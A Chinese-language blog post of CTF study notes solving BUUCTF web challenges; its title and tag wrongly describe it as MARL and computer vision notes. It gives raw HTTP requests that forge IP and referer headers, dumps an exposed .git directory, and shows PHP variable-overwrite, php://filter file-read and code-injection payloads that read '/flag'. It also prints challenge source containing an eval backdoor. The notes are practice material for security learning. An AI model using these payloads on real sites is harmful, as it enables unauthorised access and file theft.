---
layout: default
title: MARL Learning Notes
categories:
- Algorithm
tags:
- Computer Vision
---
//Description: CTF学习入门笔记。记录学习过程中遇到的问题。

//Create Date: 2025-07-02 10:31:39

//Author: channy

[toc]

# 参考书籍 
[CTF实战：从入门到提升]

题目在 [BUUCTF](https://buuoj.cn/challenges)

使用到的工具：
1. [BurpSuite](https://portswigger.net/burp)
2. [GitHacker](https://github.com/WangYihang/GitHacker)

# 1 Web
## HTTP
### [HTTP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)

修改请求信息，有`Referer`来源、`User-Agent`中客户端信息如浏览器等，及`X-Forwarded-For`伪造IP只允许本地访问

获取flag后需要把`flag{xxx}`整个commit才通过。。。只commit大括号里面的flag内容给我显示错误。。。

最终请求
```sh
GET /Secret.php HTTP/1.1
Host: node5.buuoj.cn:28483
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer:https://Sycsecret.buuoj.cn
X-Forwarded-For:127.0.0.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### [BUU BURP COURSE 1](https://buuoj.cn/challenges#BUU%20BURP%20COURSE%201)

`X-Forwarded-For:127.0.0.1`不管用了，需要`X-Real-Ip:127.0.0.1`

### [Git](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E)


```sh
python3 -m pip install -i https://pypi.org/simple/ GitHacker

githacker --url http://0d2b78ce-3914-4c05-8538-063c5b822c38.node5.buuoj.cn:81/.git/ --output-folder ./
```
flag在index.html下`n1book{git_looks_s0_easyfun}`

### [PHP变量覆盖](https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat)

先利用.git拿到php代码
```php
include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

变量覆盖，BurpSuite的GET请求直接加参数`?yds=flag`即可
```sh
GET /?yds=flag HTTP/1.1
Host: 7828c578-72e0-4c87-883f-61a3e2fd8f27.node5.buuoj.cn:81
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### [PHP文件读取](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

BurpSuite的POST请求需要加上`Content-Type: application/x-www-form-urlencoded`

text可用php://input传字符串，file可用php://filter/read=convert.Base64-encode/resource=next.php

得到一串
```sh
PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
```
暂且记下

### [PHP注入](https://buuoj.cn/challenges#[HFCTF2021%20Quals]Unsetme)
类似于SQL注入的思想
```sh
GET /?a=a%0a);%0aphpinfo( HTTP/1.1
```

```sh
GET /?a=a%0a);%0aecho%00file_get_contents(%27/flag%27 HTTP/1.1
```

### 